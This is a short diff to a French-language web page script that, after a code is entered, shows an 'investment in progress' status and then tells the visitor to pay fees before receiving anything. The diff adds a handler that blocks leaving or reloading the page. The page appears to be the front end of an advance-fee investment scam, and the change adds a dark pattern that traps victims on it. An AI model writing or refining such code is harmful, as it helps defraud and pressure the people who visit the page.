@@ -155,13 +155,20 @@
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
                 document.querySelector('#btn-receive').style.display = 'inline-block';
+                
+                // Empêcher l'actualisation de la page
+                window.addEventListener('beforeunload', (event) => {
+                    event.preventDefault();
+                    event.returnValue = '';
+                });
             } else {
                 alert("Code incorrect");
             }
         });
 
         document.querySelector('#btn-receive').addEventListener('click', () => {
-            alert('Veillez payer les frais');
+            // Afficher la boîte de dialogue
+            alert('Veuillez payer les frais demandés');
         });
 
         const progressBar = document.querySelector('.progress');
